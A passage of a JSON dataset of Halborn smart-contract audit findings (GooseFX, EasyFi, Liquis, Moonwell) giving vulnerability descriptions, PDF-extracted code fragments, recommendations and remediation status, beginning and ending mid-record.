        "body": "The offset curve is one of the swap price curves the gfx_swap program offers. On pool initialization, in the process function in initialize.rs user specify to which of the two tokens the offset should be added. This function however also sorts the tokens by mint address and in case token_b mint happens to be a lower number than token_a the offset will actually be added to token_a instead because the calculator has no concept of token ordering. This might cause the pool config to be exactly opposite to whatever it is expected to be thereby incurring a minimum loss of $0.64 to the pools creator as of the time of writing. Code Location: Listing 6: states/pool.rs (Lines 27) 11 #[ account ] 12 #[ derive ( Default , Debug )] 13 pub struct Pool { 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 } pub seed : [ u8 ; 32] , pub bump : u8 , pub lp_bump : u8 , pub admin : Pubkey , // sorted by token mint addresses pub token_mint_1 : Pubkey , pub token_mint_2 : Pubkey , pub token_vault_1 : Pubkey , pub token_vault_2 : Pubkey , pub mint : Pubkey , // the LP token mint pub fee_vault : Pubkey , pub fees : Fees , pub curve : SwapCurve , pub suspended : bool , 16 Listing 7: contexts/initialize.rs 92 let ( token_vault_1 , token_vault_2 ) = 93 ( token_a_vault . mint , token_b_vault . mint ). sort ( token_a_vault , token_b_vault ) ?; 94 let ( token_mint_1 , token_mint_2 ) = ( token_a_mint , token_b_mint ). sort_self () ?; 95 96 pool . admin = admin . key () ; 97 pool . seed = seed ; 98 pool . bump = pool_bump ; 99 pool . lp_bump = lp_bump ; 100 pool . token_mint_1 = token_mint_1 . key () ; 101 pool . token_mint_2 = token_mint_2 . key () ; 102 pool . token_vault_1 = token_vault_1 . key () ; 103 pool . token_vault_2 = token_vault_2 . key () ; 104 pool . mint = lp_token_mint . key () ; 105 pool . fee_vault = lp_token_ata_fee . key () ; 106 pool . fees = fees ; 107 pool . curve = curve ; Listing 8: src/curve/swap_curve.rs (Lines 46) 33 // / All the supported curve types . We do not use the trait object solution in the SPL . 34 // / Instead , we use enums . 35 #[ enum_dispatch ] 36 #[ repr (C ) ] 37 #[ derive ( Clone , Debug , AnchorDeserialize , AnchorSerialize )] 38 pub enum SwapCurve { 39 // / Uniswap - style constant product curve , invariant = token_a_amount * token_b_amount ConstantProductCurve , // / Flat line , always providing 1:1 from one token to another ConstantPriceCurve , // / Stable , like uniswap , but with wide zone of 1:1 instead of one point StableCurve , // / Offset curve , like Uniswap , but the token B side has a faked offset OffsetCurve , 40 41 42 43 44 45 46 47 } 17 Listing 9: curve/calculators/offset.rs (Lines 20) 15 // / Offset curve , uses ConstantProduct under the hood , but adds an offset to 16 // / one side on swap calculations 17 #[ derive ( Clone , Debug , Default , PartialEq , AnchorDeserialize , AnchorSerialize ) ] 18 pub struct OffsetCurve { 19 20 21 } // / Amount to offset the token B liquidity account pub token_b_offset : u64 , Risk Level: Likelihood - 5 Impact - 2 Recommendations: Remember to assign the offset to the user-selected token on pool ini- tialisation. Remediation Plan: SOLVED: The GooseFX team fixed this issue in commit 57f0e97da665c943b22870e70c3314fdaba19e8b. 18 ",
        "labels": [
            "Halborn",
            "GooseFX_Swap_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "CONSTRAINT FUNCTION ATTRIBUTES ARE NOT PRESERVED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The suspended function defined in src/constraints.rs is marked with the #[throws] attribute which causes the function to return an error defined in the attributes argument. This function is used by the access_control macro by constraints of several instructions defined in lib.rs. The access_control macro however does not preserve attributes which means the suspended function will never throw an error. Code Location: Listing 10: contexts/constraints.rs (Lines 5) 5 #[ throws ( ProgramError ) ] 6 pub fn suspended ( pool : & Account < '_ , Pool >) { 7 8 } require! ( !pool . suspended , Suspended ); Listing 11: src/lib.rs (Lines 51) 48 #[ account ] 49 #[ derive ( Default , Debug )] 50 #[ throws ( ProgramError ) ] 51 #[ access_control ( suspended (& ctx . accounts . pool ) )] 52 pub fn deposit2 ( 53 54 55 56 57 ) { 58 59 60 61 ctx : Context < Deposit2 >, lp_token_amount : u64 , maximum_token_a_amount : u64 , maximum_token_b_amount : u64 , lp_token_amount , maximum_token_a_amount , maximum_token_b_amount , ctx . accounts . process ( 19 )? 62 63 } anchor-attributes-access-control crate: Listing 12: src/lib.rs (Lines 71) 62 let item_fn = parse_macro_input! ( input as syn :: ItemFn ); 63 64 let fn_vis = item_fn . vis ; 65 let fn_sig = item_fn . sig ; 66 let fn_block = item_fn . block ; 67 68 let fn_stmts = fn_block . stmts ; 69 70 proc_macro :: TokenStream :: from ( quote! { 71 72 73 74 75 76 77 }) 78 } #(# access_control )* # fn_vis # fn_sig { #(# fn_stmts )* } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Upgrade Anchor to commit 5fa263ff176a6f3f1e8fb1e6667da0ec5999b6e9. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit 91e84b0322696ce9f89906c22e3134de57964294. 20 ",
        "labels": [
            "Halborn",
            "GooseFX_Swap_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOCKOUT OWNER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The Owner of the contract is usually the account which deploys the As a result, the Owner is able to perform some privileged contract. In the FarmingFactory smart contract, the renounceOwnership actions. function is used to renounce being an owner. The deploy() function in the FarmingFactory smart contract, utilizes new farming reward contract. If an owner is mistakenly renounced administrative access which ends up calling deploy() require msg.sender to be the incorrectly used owner address. In such a case, contracts would have to be redeployed. PoC Steps:  Deploy a FarmingFactory contract.  Renounce an owner of the contract.  Deploy function is not accessible with the current owner of the function. 12 Code Location: farmingFactory.sol Line #840 Listing 1: farmingFactory.sol (Lines 840) 840 841 842 843 844 845 846 847 848 849 850 851 852 853 854 855 856 857 858 859 860 861 862 863 864 function deploy ( address farmingToken , uint256 rewardAmount , uint256 rewardsDuration ) public onlyOwner { FarmingRewardsInfo storage info = farmingRewardsInfoByFarmingToken [ farmingToken ]; require ( info . farmingRewards == address (0) , \" FarmingFactory :: deploy : already deployed \" ); info . farmingRewards = address ( new FarmingRewards ( /* _rewardsDistribution = */ address ( this ) , rewardsToken , farmingToken , rewardsDuration ) ); info . rewardAmount = rewardAmount ; farmingTokens . push ( farmingToken ); } Risk Level: Likelihood - 3 Impact - 3 13 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line of codes. Listing 2: Disable Renounce Ownership (Lines 2) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: EasyFi team removed renounceOwnership function. 14 ",
        "labels": [
            "Halborn",
            "EasyFi_Farming",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The constructors from FarmingRewards and FarmingFactory contract should perform a zero-address check when receives an address as a user-supplied parameter. Code Location: FarmingFactory - Line #832 Listing 3: FarmingFactory.sol (Lines 832) 824 825 826 827 828 829 830 831 832 833 834 constructor ( address _rewardsToken , uint256 _farmingRewardsGenesis ) Ownable () require ( _farmingRewardsGenesis >= block . timestamp , \" FarmingFactory :: constructor : genesis too soon \" ); rewardsToken = _rewardsToken ; farmingRewardsGenesis = _farmingRewardsGenesis ; { } FarmingRewards - Line #618 Listing 4: FarmingRewards.sol (Lines 626,627) 618 619 620 621 622 623 624 constructor ( address _rewardsDistribution , address _rewardsToken , address _farmingToken , uint256 _rewardsDuration ) { rewardsToken = IERC20 ( _rewardsToken ); 15 625 626 627 628 } farmingToken = IERC20 ( _farmingToken ); rewardsDistribution = _rewardsDistribution ; rewardsDuration = _rewardsDuration ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. For example: Listing 5: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: SOLVED: EasyFi team added the address validation. 16 ",
        "labels": [
            "Halborn",
            "EasyFi_Farming",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Affected Smart Contract Functions: FarmingFactory: deploy,notifyRewardAmounts,notifyRewardAmount Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. 17 Remediation Plan: SOLVED: of notifyRewardAmounts() function from public to external. visibility changed EasyFi team the deploy() and 18 ",
        "labels": [
            "Halborn",
            "EasyFi_Farming",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The the Contracts repository, using Farming In block.timestamp. not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. The block.timestamp contracts variable global does are Code Location: FarmingRewards.sol Line #645 Listing 6: FarmingRewards.sol (Lines ) 645 646 647 function lastTimeRewardApplicable () public view override returns ( uint256 ) { return Math . min ( block . timestamp , periodFinish ); } FarmingRewards.sol Line #745 Listing 7: FarmingRewards.sol (Lines ) 745 746 747 748 749 750 751 752 753 754 755 756 function notifyRewardAmount ( uint256 reward ) external override onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) 19 757 758 759 760 761 762 763 764 765 766 767 768 ; } uint256 balance = rewardsToken . balanceOf ( address ( this )); require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \" ); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } FarmingFactory.sol Line #824 Listing 8: FarmingFactory.sol (Lines ) 824 825 826 827 828 829 830 831 832 833 834 constructor ( address _rewardsToken , uint256 _farmingRewardsGenesis ) Ownable () require ( _farmingRewardsGenesis >= block . timestamp , \" FarmingFactory :: constructor : genesis too soon \" ); rewardsToken = _rewardsToken ; farmingRewardsGenesis = _farmingRewardsGenesis ; { } FarmingFactory.sol Line #881 Listing 9: FarmingFactory.sol (Lines ) 881 882 883 884 885 886 887 function notifyRewardAmount ( address farmingToken ) public { require ( block . timestamp >= farmingRewardsGenesis , \" FarmingFactory :: notifyRewardAmount : not ready \" ); FarmingRewardsInfo storage info = 20 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 904 905 906 907 908 909 910 farmingRewardsInfoByFarmingToken [ farmingToken ]; require ( info . farmingRewards != address (0) , \" FarmingFactory :: notifyRewardAmount : not deployed \" ); if ( info . rewardAmount > 0) { uint256 rewardAmount = info . rewardAmount ; info . rewardAmount = 0; require ( IERC20 ( rewardsToken ). transfer ( info . farmingRewards , rewardAmount ) , \" FarmingFactory :: notifyRewardAmount : transfer failed \" ); FarmingRewards ( info . farmingRewards ). notifyRewardAmount ( rewardAmount ); } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. 21 Remediation Plan: NOT APPLICABLE: EasyFi team claims that the use of block.timestamp is deliberated. In addition, the timescale in farming contract is higher than 900 seconds. ",
        "labels": [
            "Halborn",
            "EasyFi_Farming",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF REWARD DURATION SETTER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the FarmingRewards contract, rewards duration have been set at the However, rewards duration can not be changed after the constructor. deploy. The requirements should be reviewed by EasyFi Team. If they need change rewardsDuration after the period (periodFinish) finished they should implement functions via onlyRewardsDistribution role. Code Location: FarmingRewards.sol Line #645 Listing 10: FarmingRewards.sol (Lines 627) 618 619 620 621 622 623 624 625 626 627 628 constructor ( address _rewardsDistribution , address _rewardsToken , address _farmingToken , uint256 _rewardsDuration ) { } rewardsToken = IERC20 ( _rewardsToken ); farmingToken = IERC20 ( _farmingToken ); rewardsDistribution = _rewardsDistribution ; rewardsDuration = _rewardsDuration ; 22 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Review the requirements of the farming contract and If the setter function is required, the function should be implemented. Remediation Plan: ACKNOWLEDGED: EasyFi team claims that the use is deliberated because the duration will not be changed after the deployment. 23 ",
        "labels": [
            "Halborn",
            "EasyFi_Farming",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTROLLED PARAMETER CAN LEAD TO INVALID REWARD CALCULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Some functions under FlashOptionsExerciser.sol such as claimAndExercise, claimAndLock, withdrawAndLock and earned do use an address array as a pa- rameter named _rewardPools. The array values are used as a IBaseRewardPool contract to fetch the earned amount. However, there is no validation This causes the earned returned on the parameters or white listing. value to be manipulated in those causing the exercising of the options to contain a higher amount. The _exerciseOptions function will initiate a flash loan, which will cause the executeOperation function to be trig- gered on return. At the end, the flashLoanSimple will be executing the executeOperation function, which does trigger the exercise on the olit token. The exercise function will do a transfer(address(0), amount); from the sender, in this case the FlashOptionsExerciser. The user data, corresponding to the manipulated amount will be used as the olitAmount on the olit exercise. Moreover, this means that if olit tokens are present on this contract, anyone could potentially perform a claim and exercise without even owning any reward on the pools. BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:P/S:C (6.2) Recommendation: The olit exercise function will verify that the amount of tokens is valid before exercising. However, as the olit token was not part of the scope of the audit. Full assessment was not possible. However, by itself, the parameter allows full manipulation and the code should be modified to 14 verify the addresses of the pools Remediation plan: SOLVED: The code was changed to use pool IDs instead of addresses. A registry is kept up with the pools and verified against it. The contract is named Booster. 15 ",
        "labels": [
            "Halborn",
            "Liquis_EVM_Contracts",
            "Severity: Medium"
        ]
    },
    {
        "title": "EXERCISE DOES INCREASE THE EPOCH ALWAYS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The PooledOptionsExerciser contract does allow calling exercise by anyone. This call does increment the totalWithdrawable for the current epoch and does increment the epoch. It will then transfer the amountIn of olit to the contract and amountOut of lit to the caller. However, if no amounts are transferred, for example having the amountOut being zero, the epoch will still increment, making it hard to track the epochs. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to check if the amounts are not zero. If they are, no epoch increment should happen. Remediation plan: SOLVED: The code is now checking if the amountOut == 0 and returning. 16 ",
        "labels": [
            "Halborn",
            "Liquis_EVM_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "REWARD UPDATE SHOULD NOT HAPPEN DURING VESTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The notifyRewardAmount function under PrelaunchRewardsPool can be called after the START_VESTING_DATE is reached. This can cause issues with the current vesting rewardRate and reward balances BVSS: AO:S/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (0.6) Recommendation: It is recommended to add a onlyBeforeDate check with START_VESTING_DATE on the notifyRewardAmount function. Remediation plan: SOLVED: was START_VESTING_DATE added. code The changed and a modifier checking the 17 MANUAL REVIEW 18 4.1 PrelaunchRewardsPool.sol  onlyAuthorized does check for the msg.sender to be the owner, which by default is the contract deployer.  onlyAfterDate does check if block.timestamp is greater than the parameter date.  onlyBeforeDate does check if block.timestamp is less than the pa- rameter date.  stakeLit to the lit from does sender tokens transfer the PrelaunchRewardsPool contract. It then uses the LitDepositorHelper to call convertLitToBpt which internally does call _investBalToPool This latter does transfer on the abstract contract BalInvestor. Lit tokens from the caller, which will be PrelaunchRewardsPool to the BALANCER_VAULT pool id of BAL_ETH_POOL_ID. Once joining the pool BPT (BALANCER_POOL_TOKEN) tokens are transferred to the LitDepositorHelper which, if the balance is more than 0 are transferred to PrelaunchRewardsPool. Finally, the code does call _processStake with the BPT amount which does increase the total supply and the balances for the caller.  _processStake does call using a modifier updateReward for the re- ceiver. The updateReward does call rewardPerToken which will return 0 if totalSupply is 0. (rewardPerTokenStored will be 0 initially). The lastUpdateTime value will be set to either the block.timestamp or periodFinish, the smaller value, this means that past periodFinish no new rewards are produced. Finally, if the account is different from 0 (which will be used to just update reward) the earned function is called, and the value stored under rewards. rewardPerTokenStored will be stored under userRewardPerTokenPaid for the same account.  updateReward modifier does obtain the rewardPerToken which is based on the lastUpdateTime. If no new reward is updated with update, the old rewardPerTokenStored is returned. Thereafter, lastUpdateTime is updated with Math.min(block.timestamp, periodFinish). If the update is for an account, based on the new rewardPerToken the earnings are calculated and stored under rewards for the account. The last rate for the account is stored under userRewardPerTokenPaid.  stake does transfer the specified amount of stakingToken from the It then calls the caller to the PrelaunchRewardsPool contract. 19 W E I V E R L A U N A M _processStake function with the amount and the sender. This will update the totalSupply and balances[msg.sender]  stakeAll will do the same as stake but with the full balance of sender.  stakeFor does allow specifying who you are staking to. However, the stakingToken tokens are transferred from the callers balance.  The notifyRewardAmount does state in the description that no pull method is present. However, a safeTransferFrom is performed before the value updates.  The setOwner, setCrvDepositor , setVoterProxy, setRewardToken, recoverRenouncedLiq and recoverERC20 do use onlyAuthorized.  convert does use the crvDepositor to exchange BPT tokens for Liq tokens, it sets the balance to 0 on the reward pool, subtracts the total supply and sets the isVestingUser.  The notifyRewardAmount was allowed to be called after the vesting A new period, which could cause issues with the reward rate. onlyBeforeDate(START_VESTING_DATE) modifier was added.  convert does call updateReward.  The following idea was tested and verified: Calling claim when rewards[msg.sender] == 0 will cause an underflow and deadlock if claimed[msg.sender] != 0. 4.2 Liq.sol No issues found, direct fork of Aura. 4.3 LiqMinter.sol The contract does protect the Liq token minterMint function with a times- tamp of 3 years in the future. No issues found, direct fork of Aura. W E I V E R L A U N A M 20 4.4 LiqLocker.sol  The constructor does set the initial epoch based on rewardsDuration. Some 0 checks could be implemented.  notBlacklisted does verify if both of the address arguments are not blacklisted. The second argument is only checked if different from the first argument.  modifyBlacklist does allow the owner to change the blacklist flag for a given address. Only contract addresses are supported.  shutdown allows the owner to set the isShutdown flag.  Both recoverERC20 and addReward do restrict stakingToken as the token address.  setApprovals does set the approval for the same token and address twice, one reseting to 0 and the other to type(uint256).max.  lock does internally call _lock, the _lock function does verify that the sender and _account are not blacklisted. It also checks amount and shutdown flag. It uses the _amount and adds its value to the balance tracker locked value, adding also to total supply.  It then checks for the user locks array if any previous lock is present and already unlocked by time. If no lock is present or already unlocked, it pushes the new amount with the unlock time being the end of epoch.  If there is already a previous lock for this epoch, it adds the amount to it.  It then checks the delegatee for the caller account and incre- ments the delegateeUnlocks and adds a _checkpointDelegate. This should be double-checked to make sure that the delegatee cannot use the locked tokens as there is no unlock time verification like done when pushing LockedBalance.  Finally, it updates the epoch total supply.  _checkpointDelegate does accept an address and the addition/de- Votes are using to224 instead of to112 as the duction values. LockedBalance. 21 W E I V E R L A U N A M  delegate does verify that the address is not 0 and that the given delegatee is not the previous one. There is no way to reset or remove delegation. It will iterate over all pending userLocks for the upcoming epoch, remove them from the oldDelegatee and transfer them to newDelegatee. A checkpoint with deduction is stored for the old delegatee and with additions to the new delegatee.  _checkpointsLookup performs a binary search on the epoch and returns the DelegateeCheckpoint.  findEpochId does return the epoch id since the first epochs created since contract creation. It will underflow if the _time is prior contract creation. However, the compiler version will catch the bug.  totalSupplyAtEpoch does add all previous epoch supplies.  getReward does allow fetching the reward for any address, stacking is only allowed if the address is the sender.  The _skipIdx version does not check for cvxCrv and stake auto- matically.  getRewardFor does verify that the caller has permissions to grab rewards for the parameter account. It then transfers all rewards to the account but olit tokens, which are transferred to the caller. From the smart contract context, the olit tokens are transferred to authorized OptionsExerciser contracts.  queueNewRewards does only allow to be called by the approved dis- tributors.  _checkpointEpoch does verify if epoch times have passed though by using the current block.timestamp. If an epoch has passed, they are pushed with supply of 0 to the epoch array. 4.5 LiqVestedEscrow.sol Direct fork/renamed from Aura. 22 W E I V E R L A U N A M  fund will store for recipients the given amount of parameters. The total amount is transferred from the sender.  claim does directly allow locking your reward tokens via the LiqLocker.  cancel does set the totalLocked after the safeTransfer which could lead to a reentrancy if rewardToken is not safe/trusted. 4.6 ExtraRewardsDistributor.sol Direct fork/renamed from Aura. 4.7 FlashOptionsExerciser.sol  Constructor does approve oLIT token to spend all weth on this con- tract. It also approves balVault and litDepositorHelper to spend all LIT tokens from this contract.  setOwner does check for previous ownership acl.  exerciseAndLock does call _exerciseOptions which will skip flash loan if amount is zero. However, in case that anyone does transfer LIT tokens to this contract, _convertLitToLiqLit will be called and tokens deposited even if the amount specified on the parameter was zero as the balance of the contract is used for the deposit. Issues: _exerciseOptions should not rely on the _olitAmount of the parameter, since _rewardPools could be faked and the returned values wrongly used. executeOperation instead of decoding the params it should be using the balance of olit. At the end, the flashLoanSimple will be executing the executeOperation function, which does trigger the exercise on the olit token. The exercise function will do a transfer(address(0), amount); from the sender, in this case the FlashOptionsExerciser. This means that if olit tokens are present 23 W E I V E R L A U N A M on this contract, anyone could potentially perform a claim an exercise without even owning any reward on the pools. Same approach is followed on claimAndQueue in contracts/peripheral/ PooledOptionsExerciser.sol 4.8 PooledOptionsExerciser.sol  The queue function will store into a mapping of the user/epoch the amount of olit queued and also on the totalQueued. However, there is no check if the epoch should be updated or not. Probably assuming epoch will be manually updated on another function.  The claimAndQueue function will do the same as queue but claiming The balance funds from the provided reward pools as parameter. used to queue is the diff between the before claim and after claim balance.  The unqueue function, does allow removing from the last epoch and transfers it to the owner.  The _exerciseAmounts function does add to the olitOracle multiplier the fee amount based on the basis value.  The withdrawAndQueue and claimAndQueue does allow specifying the reward pool address. Issues: Code duplication: All functions do use the following snippet, it could be extracted into an internal function: Listing 1 1 2 queued [ msg . sender ][ epoch ] -= amount ; totalQueued [ epoch ] -= amount ; 24 W E I V E R L A U N A M 4.9 PoolMigrator.sol Direct fork/renamed from Aura. 4.10 BalLiquidityProvider.sol Direct fork/renamed from Aura. 4.11 BoosterHelper.sol Direct fork/renamed from Aura. 4.12 ClaimFeesHelper.sol Direct fork/renamed from Aura. 4.13 GaugeMigrator.sol Direct fork/renamed from Aura. 4.14 BalInvestor.sol contract implementing the Abstract BAL_ETH_POOL_ID. It does correctly compute the _getMinOut function, by weighting both amount and oracle prices with 1e18. The returned value is not weighted. approve join ways and to 25 W E I V E R L A U N A M 4.15 LitDepositorHelper.sol Does make use of BalInvestor to deposit and convert LIT, WETH or ETH to LIT/WETH and sends to the user BPT tokens from the joining of the pool.  The _depositFor function does check the asset deposited. It can be LIT, WETH or ETH. In the case of ETH the balance is first deposited on the WETH contract and wrapped. This is required as the _investSingleToPool does only accept two assets, LIT and WETH. 4.16 BaseRewardPool.sol (convex) Minor formatting changes from the convex fork. Added the getRewardFor function: - The function calls updateReward for the account parameter and then sends oLIT to OptionsExerciser 4.17 BaseRewardPool4626.sol Forked from Aura with changes. Implements the transfer function: - Allows tokenized pool deposits to be transferred 4.18 Permission.sol (convex) New contract added with whitelisting functionality on a caller. It does allow calling modifyPermission to set a parameter caller as allowed on behalf of msg.sender actions such as getRewardFor on BaseRewardPool. 26 W E I V E R L A U N A M THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Liquis_EVM_Contracts",
            "Severity: Informational"
        ]
    },
    {
        "title": "OLD TOKENS ARE NOT RECOVERABLE WHEN THE NEW TOKEN IS SET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "The privileged address can set the token. However, when the token is set to another address, the old tokens cannot be retrieved using the contract. Scenario:  Admin sets allocation via setAllocations function.  After the time, the user claims allocations.  Admin sets new token on the contract.  Old tokens are not recoverable by the contract. The withdraw function only takes an amount of argument. Code Location: Listing 1: TokenSaleDistributor.sol 197 function setTokenAddress ( address newTokenAddress ) external  adminOnly { 198  ; 199 200 } require ( tokenAddress == address (0) , \" Address already set \" ) tokenAddress = newTokenAddress ; Risk Level: Likelihood - 3 Impact - 3 17 Recommendation: Consider adding the following function for the accidental setTokenAddress function call. Listing 2 function withdraw ( address token , uint amount ) external IERC20 ( token ). safeTransfer ( admin , amount ); 1  adminOnly { 2 3 } Remediation Plan: SOLVED: The Moonwell Team solved this issue by implementing the withdraw function in the TokenSaleDistributor.sol contract. Commit ID: Commit ID 18 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "EXPIRED TOKENS ARE NOT CONSIDERED IN THE VOTING POWER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been observed that expired tokens are not included in the voting power. Although the expired tokens are not used in the contract depends on the protocol behavior that can directly affect voting. The voting power should be carefully designed with expired tokens. Code Location: Listing 3: TokenSaleDistributor.sol 195 function totalVotingPower ( address user ) public view returns (  uint ) { 196 197 198 199 } uint totalAllocatedToUser = totalAllocated ( user ); uint totalClaimedByUser = totalClaimed ( user ); return totalAllocatedToUser - totalClaimedByUser ; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to check all token features in the voting power. If the expired tokens are not used, the related code section should be removed from the code base. 19 Remediation Plan: SOLVED: The Moonwell Team solved this issue by deleting expired tokens from the code base. Commit ID: Commit ID 20 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER CAN RESET ALLOCATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that the owner can delete all delegations from any account. Code Location: Listing 4: TokenSaleDistributor.sol 195 function resetAllocationsByUser ( address [] memory recipients )  external adminOnly { 196 197 198 199 uint length = recipients . length ; for ( uint i; i < length ; ++ i) { uint votingPower = totalVotingPower ( recipients [ i ]) ; _moveDelegates ( delegates [ recipients [ i ]] , address (0) ,  votingPower ); delete allocations [ recipients [ i ]]; 200 201 202 } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider, not deleting, voting power and allocations users with the resetAllocationsByUser function, however If It is not possible, It is recommended to carefully manage the owner accounts private key to avoid any potential risks of being hacked. In terms of short-term and long-term goal: 21  Time-lock with reasonable latency, e.g. 48 hours, for awareness on privileged operations.  Assignment of privileged roles to multi-signature wallets to prevent a single point of failure due to the private key. Remediation Plan: RISK ACCEPTED: The Moonwell Team states that they will do this if they found a critical vulnerability after deployment, and they needed to claw back all tokens to prevent them from being stolen. In that case, they will deploy a new contract and re-add the claims as well. On the other hand, The Moonwell Team commented the feature on the code with the following PR. Commit ID: Commit ID 22 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Token_Sale_and_Comptroller_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf",
